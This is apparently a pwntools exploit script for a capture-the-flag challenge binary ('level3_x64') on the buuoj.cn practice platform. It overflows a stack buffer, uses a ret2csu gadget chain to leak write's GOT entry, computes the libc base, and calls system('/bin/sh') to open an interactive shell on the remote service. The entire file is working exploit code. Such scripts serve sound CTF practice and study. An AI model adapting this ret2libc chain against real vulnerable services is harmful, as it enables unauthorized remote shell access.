from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')
libc = ELF('./2.23-0ubuntu11.3_amd64/libc-2.23.so')
ld = ELF('./2.23-0ubuntu11.3_amd64/ld-2.23.so')
elf = ELF("./level3_x64")
#sh = process(argv = [ld.path, elf.path], env = {"LD_PRELOAD" : libc.path})
sh = remote('node4.buuoj.cn', 25871)
#gdb.attach(sh)

csu_start = 0x4006AA
csu_end = 0x400690


def csu(rbx, rbp, r12, r13, r14, r15):
    payload = p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(csu_end)
    payload += p64(0) * 7
    return payload

sh.recvuntil("Input:\n")
payload = b'1' * 0x80 + p64(0xdeadbeef) + p64(csu_start)
payload += csu(0, 1, elf.got['write'], 8, elf.got['write'], 1) + p64(0x4005E6)
sh.sendline(payload)
addr = sh.recvuntil('\x7f')[-6:].ljust(8, b'\x00')
addr = u64(addr)
print(hex(addr))

libc_base = addr - 0xf72b0
system_addr = libc_base + 0x45390
str_bin_sh = libc_base + 0x18cd57

sh.recvuntil("Input:\n")

payload = b'1' * 0x88 + p64(0x00000000004006b3) + p64(str_bin_sh) + p64(system_addr) 

sh.sendline(payload)
sh.interactive()
